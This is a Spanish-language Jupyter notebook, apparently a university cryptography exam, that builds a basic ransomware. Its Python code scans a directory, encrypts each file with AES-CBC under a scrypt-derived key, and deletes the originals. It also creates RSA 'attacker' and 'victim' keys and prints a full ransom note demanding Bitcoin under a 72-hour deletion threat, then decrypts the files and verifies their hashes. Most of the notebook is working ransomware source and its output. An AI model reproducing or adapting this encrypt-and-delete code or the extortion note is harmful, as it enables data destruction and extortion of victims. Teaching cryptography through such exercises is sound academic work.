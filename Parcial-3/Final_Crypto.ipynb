{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "# **Ransomware**\n",
        "El objetivo de este examen es desarrollar un ransomware básico en el que se\n",
        "apliquen todos los conceptos vistos a lo largo del curso\n",
        "\n",
        "Realizado por: \\\\\n",
        "Tábata Nicole Llach Brugés \\\\\n",
        "Doriano Alberto Ojeda Diaz \\\\\n",
        "Alan Daniel Florez Cerro\n"
      ],
      "metadata": {
        "id": "x8egDqLg_TVs"
      }
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "bWyisc76_DHv",
        "outputId": "69e4e13d-2926-458d-bcbf-44ead16c2157"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Collecting pycryptodome\n",
            "  Downloading pycryptodome-3.21.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)\n",
            "Downloading pycryptodome-3.21.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)\n",
            "\u001b[?25l   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m0.0/2.3 MB\u001b[0m \u001b[31m?\u001b[0m eta \u001b[36m-:--:--\u001b[0m\r\u001b[2K   \u001b[91m━━\u001b[0m\u001b[91m╸\u001b[0m\u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m0.1/2.3 MB\u001b[0m \u001b[31m4.2 MB/s\u001b[0m eta \u001b[36m0:00:01\u001b[0m\r\u001b[2K   \u001b[91m━━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[90m╺\u001b[0m\u001b[90m━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m1.2/2.3 MB\u001b[0m \u001b[31m17.2 MB/s\u001b[0m eta \u001b[36m0:00:01\u001b[0m\r\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m2.3/2.3 MB\u001b[0m \u001b[31m21.6 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hInstalling collected packages: pycryptodome\n",
            "Successfully installed pycryptodome-3.21.0\n"
          ]
        }
      ],
      "source": [
        "!pip install pycryptodome"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import os\n",
        "from Crypto.PublicKey import RSA\n",
        "from Crypto.Signature import pkcs1_15\n",
        "from Crypto.Hash import SHA256\n",
        "from Crypto.Cipher import PKCS1_OAEP, AES\n",
        "from Crypto.Protocol.KDF import scrypt\n",
        "from Crypto.Random import get_random_bytes\n",
        "from Crypto.Util.Padding import pad, unpad\n",
        "import base64"
      ],
      "metadata": {
        "id": "HIiR72o-_vhG"
      },
      "execution_count": 2,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Verificación de la Integridad de Archivos**"
      ],
      "metadata": {
        "id": "cEXcQWyooEN_"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def calculate_file_hash(file_path):\n",
        "    \"\"\"Calculates the SHA-256 hash of the given file.\"\"\"\n",
        "    sha256_hash = SHA256.new()\n",
        "    try:\n",
        "        with open(file_path, \"rb\") as file:\n",
        "            # Read and update hash string value in blocks of 4K\n",
        "            for byte_block in iter(lambda: file.read(4096), b\"\"):\n",
        "                sha256_hash.update(byte_block)\n",
        "    except FileNotFoundError:\n",
        "        return None\n",
        "    return sha256_hash.hexdigest()\n",
        "\n",
        "def verify_file_integrity(file_to_verify,original_hash):\n",
        "    \"\"\"Verifies the integrity of the current file against the original file.\"\"\"\n",
        "    current_hash = calculate_file_hash(file_to_verify)\n",
        "\n",
        "    if original_hash is None or current_hash is None:\n",
        "        return False\n",
        "\n",
        "    return original_hash == current_hash\n"
      ],
      "metadata": {
        "id": "UI56817w_0Ou"
      },
      "execution_count": 3,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Escaneo de Archivos para Cifrado y Cálculo de Hashes**"
      ],
      "metadata": {
        "id": "t6hti0puqhg5"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def get_files_to_encrypt() -> list:\n",
        "  scan_directory = './sample_data'\n",
        "\n",
        "  files_to_encrypt = []\n",
        "  file_path = []\n",
        "  for root, dirs, files in os.walk(scan_directory):\n",
        "      for file in files:\n",
        "        if not file.startswith('.'):\n",
        "          file_path.append(os.path.join(root, file))\n",
        "          file_path.append(calculate_file_hash(os.path.join(root, file)))\n",
        "          files_to_encrypt.append(file_path)\n",
        "        file_path = []\n",
        "\n",
        "  return files_to_encrypt"
      ],
      "metadata": {
        "id": "c5vCj-KUjWD1"
      },
      "execution_count": 4,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Par de Llaves RSA de 2048 bits**"
      ],
      "metadata": {
        "id": "E_V5Sdd9tACM"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def generate_rsa_key_pair():\n",
        "    key = RSA.generate(2048)\n",
        "    private_key = key.export_key()\n",
        "    public_key = key.publickey().export_key()\n",
        "    return private_key, public_key"
      ],
      "metadata": {
        "id": "7sPPBX3EjaPe"
      },
      "execution_count": 5,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Certificado Digital con Identidad y Llave Pública**"
      ],
      "metadata": {
        "id": "MdNZBa3QvYsB"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def create_certificate(identity, public_key):\n",
        "    return {\n",
        "        'id': identity,\n",
        "        'pk': base64.b64encode(public_key).decode('utf-8')\n",
        "    }"
      ],
      "metadata": {
        "id": "XEL5ONJ-jcdJ"
      },
      "execution_count": 6,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Cifrar Archivos utilizando AES en Modo CBC**"
      ],
      "metadata": {
        "id": "Ok03anCiwS24"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def encrypt_file(file_path, key):\n",
        "    with open(file_path, 'rb') as f:\n",
        "        plaintext = f.read()\n",
        "\n",
        "    iv = get_random_bytes(16)\n",
        "    cipher = AES.new(key, AES.MODE_CBC, iv)\n",
        "    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))\n",
        "    with open(file_path + '.enc', 'wb') as f:\n",
        "        f.write(iv + ciphertext)\n",
        "    # eliminar archivo original\n",
        "    os.remove(file_path)"
      ],
      "metadata": {
        "id": "RrFiqPjHjd4r"
      },
      "execution_count": 7,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Descifrar Archivos Utilizando AES en Modo CBC**"
      ],
      "metadata": {
        "id": "5Vpza-9wz8fX"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def decrypt_file(file_path, key):\n",
        "    with open(file_path + '.enc', 'rb') as f:\n",
        "        ciphertext = f.read()\n",
        "\n",
        "    iv = ciphertext[:16]\n",
        "    cipher = AES.new(key, AES.MODE_CBC, iv)\n",
        "    plaintext = unpad(cipher.decrypt(ciphertext[16:]), AES.block_size)\n",
        "    with open(file_path, 'wb') as f:\n",
        "        f.write(plaintext)\n",
        "    # eliminar archivo cifrado\n",
        "    os.remove(file_path + '.enc')"
      ],
      "metadata": {
        "id": "dn1vjiD1jht9"
      },
      "execution_count": 8,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "def verify_files(files_to_encrypt):\n",
        "    for file_path in files_to_encrypt:\n",
        "        if os.path.exists(file_path[0] + '.enc'):\n",
        "            print(r'El archivo {} ha sido cifrado'.format(file_path))\n",
        "        else:\n",
        "            print(r'El archivo {} es decriptado'.format(file_path))"
      ],
      "metadata": {
        "id": "ug70lMnjjmgZ"
      },
      "execution_count": 9,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [],
      "metadata": {
        "id": "fwHjemNijsw8"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "if __name__ == '__main__':\n",
        "  # Pares de claves RSA de 2048 bits para el atacante y la víctima. Estas claves se utilizarán para el cifrado asimétrico y las firmas digitales.\n",
        "  attacker_private_key, attacker_public_key = generate_rsa_key_pair()\n",
        "  victim_private_key, victim_public_key = generate_rsa_key_pair()\n",
        "  # Certificados digitales\n",
        "  attacker_cert = create_certificate('attacker', attacker_public_key)\n",
        "  victim_cert = create_certificate('victim', victim_public_key)\n",
        "\n",
        "  # Mensaje a firmar y cifrar de 1024 bits\n",
        "  session_key = get_random_bytes(128)\n",
        "\n",
        "  hash_session_key = SHA256.new(session_key)\n",
        "\n",
        "  # Firma digital\n",
        "  signature = pkcs1_15.new(RSA.import_key(attacker_private_key)).sign(hash_session_key)\n",
        "\n",
        "  # Cifrado del mensaje con la clave pública de la víctima\n",
        "  cipher_rsa = PKCS1_OAEP.new(RSA.import_key(victim_public_key))\n",
        "  encrypted_session_key = cipher_rsa.encrypt(session_key)\n",
        "\n",
        "  # Verificar la firma con la clave pública del atacante\n",
        "  try:\n",
        "      pkcs1_15.new(RSA.import_key(attacker_public_key)).verify(hash_session_key, signature)\n",
        "      print(\"La firma es válida.\")\n",
        "  except (ValueError, TypeError):\n",
        "      print(\"La firma no es válida.\")\n",
        "\n",
        "  # Descifrar el mensaje con la clave privada de la víctima\n",
        "  cipher_rsa_victim = PKCS1_OAEP.new(RSA.import_key(victim_private_key))\n",
        "  decrypted_session_key = cipher_rsa_victim.decrypt(encrypted_session_key)\n",
        "\n",
        "\n",
        "  # Derivar la clave AES usando scrypt\n",
        "  salt = get_random_bytes(16)\n",
        "  aes_key = scrypt(decrypted_session_key, salt, 32, N=2**14, r=8, p=1)  # AES-256 requiere una clave de 32 bytes\n",
        "\n",
        "\n",
        "  # Cifrar los archivos escaneados dentro del disco.\n",
        "  files_to_encrypt = get_files_to_encrypt()\n",
        "  print(files_to_encrypt)\n",
        "  for file_path in files_to_encrypt:\n",
        "    encrypt_file(file_path[0], aes_key)\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Z-VT3Q7njxhM",
        "outputId": "34c4f28d-05f3-4e6a-f6e4-6b3e5b7447e1"
      },
      "execution_count": 22,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "La firma es válida.\n",
            "[['./sample_data/README.md', 'a63d715f48c25c4f0b207afe4d7eb1547b08b92c33b126971e701e9590e1173d'], ['./sample_data/anscombe.json', '90438f1f2421013b58106a7eac28a289604c70e7bdaa28b829d6d8f5bd43c742'], ['./sample_data/california_housing_train.csv', 'bb9ca4041a66e0ed691cb825188f16fdab518435c4950a080951be2fdfe30d4d'], ['./sample_data/california_housing_test.csv', 'be3f531aac5aca44fe1c04fd888b4aa68a9a69f69c05d0eb2e0473dfe702dda2'], ['./sample_data/mnist_train_small.csv', '1ef64781aa03180f4f5ce504314f058f5d0227277df86060473d973cf43b033e'], ['./sample_data/mnist_test.csv', '51c292478d94ec3a01461bdfa82eb0885d262eb09e615679b2d69dedb6ad09e7']]\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "for file_path in files_to_encrypt:\n",
        "    if verify_file_integrity(file_path[0], file_path[1]):\n",
        "        print(f\"El archivo '{file_path[0]}' no está cifrado.\")\n",
        "    else:\n",
        "        print(f\"El archivo '{file_path[0]}' está cifrado.\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "KFHJS8R2j2IZ",
        "outputId": "66508b04-738c-46a7-8d91-e6ed3f09f869"
      },
      "execution_count": 23,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "El archivo './sample_data/README.md' está cifrado.\n",
            "El archivo './sample_data/anscombe.json' está cifrado.\n",
            "El archivo './sample_data/california_housing_train.csv' está cifrado.\n",
            "El archivo './sample_data/california_housing_test.csv' está cifrado.\n",
            "El archivo './sample_data/mnist_train_small.csv' está cifrado.\n",
            "El archivo './sample_data/mnist_test.csv' está cifrado.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# Notificación al usuario\n",
        "print(\"                 ¡IMPORTANTE! TODOS SUS ARCHIVOS HAN SIDO CIFRADOS\")\n",
        "print(f\"\\nHemos cifrado {len(files_to_encrypt)} de sus archivos importantes en este equipo.\")\n",
        "print(\"Para recuperar sus archivos, siga las siguientes instrucciones:\\n\")\n",
        "\n",
        "print(\"1. Realice un pago de 0.25 Bitcoins a la siguiente dirección:\")\n",
        "print(\"   Dirección de Bitcoin: 4AD5214DS3FS2G1DFG3B1B5B3FDB4D5HH3H1\")\n",
        "\n",
        "print(\"\\n2. Envíe un correo electrónico con su ID de transacción a:\")\n",
        "print(\"   correo@ejemplo.com\")\n",
        "\n",
        "print(\"\\n3. Una vez que confirmemos la transacción, le enviaremos la clave para descifrar sus archivos.\")\n",
        "\n",
        "print(\"\\nADVERTENCIA:\")\n",
        "print(\"- No intente descifrar sus archivos por su cuenta; puede causar daños permanentes.\")\n",
        "print(\"- Si no realiza el pago en 72 horas, todos sus archivos serán eliminados permanentemente.\")\n",
        "\n",
        "print(\"\\n¡Gracias por su cooperación!\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "G6_Cf_O9j5iY",
        "outputId": "feb2c984-9621-421d-c69a-d54af11cc720"
      },
      "execution_count": 24,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "                 ¡IMPORTANTE! TODOS SUS ARCHIVOS HAN SIDO CIFRADOS\n",
            "\n",
            "Hemos cifrado 6 de sus archivos importantes en este equipo.\n",
            "Para recuperar sus archivos, siga las siguientes instrucciones:\n",
            "\n",
            "1. Realice un pago de 0.25 Bitcoins a la siguiente dirección:\n",
            "   Dirección de Bitcoin: 4AD5214DS3FS2G1DFG3B1B5B3FDB4D5HH3H1\n",
            "\n",
            "2. Envíe un correo electrónico con su ID de transacción a:\n",
            "   correo@ejemplo.com\n",
            "\n",
            "3. Una vez que confirmemos la transacción, le enviaremos la clave para descifrar sus archivos.\n",
            "\n",
            "ADVERTENCIA:\n",
            "- No intente descifrar sus archivos por su cuenta; puede causar daños permanentes.\n",
            "- Si no realiza el pago en 72 horas, todos sus archivos serán eliminados permanentemente.\n",
            "\n",
            "¡Gracias por su cooperación!\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#notify victim how to decrypt files\n",
        "print(\"utiliza la siguiente clave para decryptar tus archivos: \", base64.b64encode(aes_key))"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "eLN7KJjxj7zH",
        "outputId": "53f9b0a3-4d41-4318-8900-e1f5ff5f9a9d"
      },
      "execution_count": 25,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "utiliza la siguiente clave para decryptar tus archivos:  b'YoXE4oppRxtoIfkqUSIrLJdbFDcHSaHE0o9s/vNkCqA='\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "for file_path in files_to_encrypt:\n",
        "  decrypt_file(file_path[0], aes_key)"
      ],
      "metadata": {
        "id": "n28Do8LXj96p"
      },
      "execution_count": 26,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "for file_path in files_to_encrypt:\n",
        "    # Verificamos la integridad del archivo comparando el hash actual con el original\n",
        "    if verify_file_integrity(file_path[0], file_path[1]):\n",
        "        print(f\"El archivo '{file_path[0]}' no sigue cifrado y mantiene su integridad a pesar del ataque.\")\n",
        "    else:\n",
        "        print(f\"El archivo '{file_path[0]}' sigue cifrado o ha sido corrompido.\")\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "l6QX0clgj_Ab",
        "outputId": "8f0540ef-a64f-4784-e586-38671876cf1a"
      },
      "execution_count": 28,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "El archivo './sample_data/README.md' no sigue cifrado y mantiene su integridad a pesar del ataque.\n",
            "El archivo './sample_data/anscombe.json' no sigue cifrado y mantiene su integridad a pesar del ataque.\n",
            "El archivo './sample_data/california_housing_train.csv' no sigue cifrado y mantiene su integridad a pesar del ataque.\n",
            "El archivo './sample_data/california_housing_test.csv' no sigue cifrado y mantiene su integridad a pesar del ataque.\n",
            "El archivo './sample_data/mnist_train_small.csv' no sigue cifrado y mantiene su integridad a pesar del ataque.\n",
            "El archivo './sample_data/mnist_test.csv' no sigue cifrado y mantiene su integridad a pesar del ataque.\n"
          ]
        }
      ]
    }
  ]
}